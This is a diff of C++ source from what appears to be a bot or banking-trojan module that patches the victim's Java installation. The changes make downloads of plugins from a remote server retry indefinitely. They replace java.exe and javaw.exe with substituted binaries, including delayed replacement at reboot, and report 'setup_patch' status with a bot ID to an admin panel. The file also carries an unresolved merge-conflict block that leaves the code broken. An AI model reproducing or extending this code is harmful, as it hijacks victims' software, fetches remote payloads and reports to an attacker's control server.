@@ -17,7 +17,7 @@
 #include "Richedit.h"
 
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace java_patcher
 {
@@ -39,7 +39,7 @@ static int javaCompatible = 0; //совместимость явы для разных алгоритмов установ
 static char javaHome[MAX_PATH]; //папка явы
 static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
 
-char versionPatch[] = "1.3"; //версия патча
+char versionPatch[] = "1.4"; //версия патча
 
 //Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
 static bool GetJavaVersion()
@@ -348,29 +348,36 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 	char url[256];
 	m_lstrcpy( url, baseUrl );
 	m_lstrcat( url, addUrl );
-	DWORD szData;
-	char* data = DownloadPlugin( url, &szData, false );
 	bool res = false;
-	if( data )
+	for(;;)
 	{
-		unsigned long crc1 = GetCRC32( data, szData );
-		unsigned long crc2 = GetCorrectCRC32( filesCrc32, crcName );
-		if( crc1 == crc2 )
+		DWORD szData;
+		char* data = DownloadPlugin( url, &szData, false );
+		if( data )
 		{
-			DWORD saved = File::WriteBufferA( (char*)fileName, data, szData );
-			if( saved == szData )
+			unsigned long crc1 = GetCRC32( data, szData );
+			unsigned long crc2 = GetCorrectCRC32( filesCrc32, crcName );
+			if( crc1 == crc2 )
 			{
-				res = true;
+				DWORD saved = File::WriteBufferA( (char*)fileName, data, szData );
+				if( saved == szData )
+				{
+					res = true;
+				}
+				else
+					DBG( "JavaPatcher", "Error saved %s, loaded size (%d) != saved size (%d)", fileName, szData, saved );
 			}
 			else
-				DBG( "JavaPatcher", "Error saved %s, loaded size (%d) != saved size (%d)", fileName, szData, saved );
+				DBG( "JavaPatcher", "Error crc32 for %s", url );
+			STR::Free(data);
+			break;
 		}
 		else
-			DBG( "JavaPatcher", "Error crc32 for %s", url );
-		STR::Free(data);
+		{
+			DBG( "JavaPatcher", "Failed Download %s", url );
+			pSleep(3 * 60000); //ждем 3 минуты, и потом снова пытаемся загрузить
+		}
 	}
-	else
-		DBG( "JavaPatcher", "Failed Download %s", url );
 	return res;
 }
 
@@ -866,7 +873,7 @@ void SendLogToAdmin( const char* c, const char* v )
 	STR::Free(adminUrl);
 }
 
-static bool ReplacementExe(const char* java, const char* javao, const char* javaExe)
+static bool ReplacementExe(const char* java, const char* javao, const char* javaExe, bool afterReboot)
 {
 	MemPtr<MAX_PATH> srcJava, dstJava;
 	m_lstrcpy( srcJava, javaHome );
@@ -875,25 +882,33 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	pPathAppendA( srcJava.str(), java );
 	pPathAppendA( dstJava.str(), javao );
 	bool ret = true;
-	if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
+	if( afterReboot )
 	{
-		if( pMoveFileA( srcJava.str(), dstJava.str() ) )
-		{
-			DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
-		}
-		else
-		{
-			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
-			ret = false;
-		}
-	}
-	if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
-	{
-		DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
+		pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+		pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 	}
 	else
-		ret = false;
-	pDeleteFileA(javaExe);
+	{
+		if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
+		{
+			if( pMoveFileA( srcJava.str(), dstJava.str() ) )
+			{
+				DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
+			}
+			else
+			{
+				DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+				ret = false;
+			}
+		}
+		if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
+		{
+			DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
+		}
+		else
+			ret = false;
+		pDeleteFileA(javaExe);
+	}
 	return ret;
 }
 
@@ -948,6 +963,9 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				if( counter == 3 )
 				{
 					#ifdef KillOs_RebootH
+					SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
+					ReplacementExe( "java.exe", "javao.exe", javaExe.str(), true );
+					ReplacementExe( "javaw.exe", "javawo.exe", javaExew.str(), true );
 					Reboot();
 					#endif
 				}
@@ -974,11 +992,16 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				res = FALSE;		
 			}
 			//Подменяем яву
+<<<<<<< HEAD
 			if( ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() ) )
 				if( ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str() ) )
+=======
+			if( ReplacementExe( "java.exe", "javao.exe", javaExe.str(), false ) )
+				if( ReplacementExe( "javaw.exe", "javawo.exe", javaExew.str(), false ) )
+>>>>>>> 946d757351e5023880979f335d2be1ff25c867c8
 				{
 					//сообщаем админке, что ява патч установлен
-					SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
+					SendLogToAdmin( adminUrl, botUid, "setup_patch", "2" );
 				}
 		};
 
